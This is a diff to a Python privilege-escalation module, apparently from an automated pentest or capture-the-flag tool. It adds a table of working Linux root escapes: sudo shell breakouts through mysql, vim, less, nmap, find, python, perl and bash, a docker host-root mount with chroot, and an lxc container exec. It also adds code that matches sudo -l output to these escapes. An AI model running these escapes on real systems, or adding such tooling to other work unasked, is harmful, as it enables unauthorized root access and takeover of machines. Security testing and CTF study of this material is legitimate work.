@@ -122,6 +122,54 @@ class PrivilegeEscalation:
             "confidence": 0.85
         },
         {
+            "name": "SudoMySQL",
+            "check": "sudo -l | grep mysql",
+            "exploit": "sudo mysql -e '\\! /bin/sh'  OR  sudo mysql -e '\\! cat /root/flag*'",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoVim",
+            "check": "sudo -l | grep vim",
+            "exploit": "sudo vim -c ':!/bin/sh'",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoLess",
+            "check": "sudo -l | grep less",
+            "exploit": "sudo less /etc/passwd\\n!/bin/sh",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoNmap",
+            "check": "sudo -l | grep nmap",
+            "exploit": "sudo nmap --interactive\\n!sh",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoFind",
+            "check": "sudo -l | grep find",
+            "exploit": "sudo find / -exec /bin/sh \\;",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoPython",
+            "check": "sudo -l | grep python",
+            "exploit": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoPerl",
+            "check": "sudo -l | grep perl",
+            "exploit": "sudo perl -e 'exec \"/bin/sh\";'",
+            "confidence": 0.95
+        },
+        {
+            "name": "SudoBash",
+            "check": "sudo -l | grep -E 'bash|sh'",
+            "exploit": "sudo -u root /bin/bash",
+            "confidence": 0.95
+        },
+        {
             "name": "Cron",
             "check": "cat /etc/crontab; ls -la /etc/cron*",
             "exploit": "Writable cron scripts",
@@ -132,6 +180,18 @@ class PrivilegeEscalation:
             "check": "getcap -r / 2>/dev/null",
             "exploit": "Abuse file capabilities",
             "confidence": 0.8
+        },
+        {
+            "name": "Docker",
+            "check": "id | grep docker; ls /var/run/docker.sock",
+            "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            "confidence": 0.9
+        },
+        {
+            "name": "LXC/LXD",
+            "check": "id | grep lxd; lxc list",
+            "exploit": "lxc exec privileged-container -- /bin/sh",
+            "confidence": 0.9
         }
     ]
 
@@ -283,12 +343,42 @@ class PrivilegeEscalation:
                 analysis["is_admin"] = True
                 analysis["is_system"] = True
 
-            # 检查Sudo配置
-            if sudo_output and "(root)" in sudo_output:
-                analysis["methods"].append({
-                    "name": "Sudo",
-                    "confidence": 0.85
-                })
+            # 检查Sudo配置 - 检测特定提权路径
+            if sudo_output:
+                sudo_lower = sudo_output.lower()
+
+                # 检测常见的sudo提权命令
+                sudo_escapes = {
+                    "mysql": "SudoMySQL",
+                    "vim": "SudoVim",
+                    "vi": "SudoVim",
+                    "less": "SudoLess",
+                    "more": "SudoLess",
+                    "nmap": "SudoNmap",
+                    "find": "SudoFind",
+                    "python": "SudoPython",
+                    "python3": "SudoPython",
+                    "perl": "SudoPerl",
+                    "bash": "SudoBash",
+                    "sh": "SudoBash",
+                    "zsh": "SudoBash",
+                    "docker": "Docker",
+                }
+
+                for cmd, method_name in sudo_escapes.items():
+                    if cmd in sudo_lower and ("(root)" in sudo_output or "nopasswd" in sudo_lower):
+                        analysis["methods"].append({
+                            "name": method_name,
+                            "confidence": 0.95,
+                            "command": cmd
+                        })
+
+                # 如果有任意sudo权限但没匹配到特定命令
+                if "(root)" in sudo_output and not analysis["methods"]:
+                    analysis["methods"].append({
+                        "name": "Sudo",
+                        "confidence": 0.85
+                    })
 
             # 检查SUID
             if suid_output and len(suid_output.strip()) > 0:
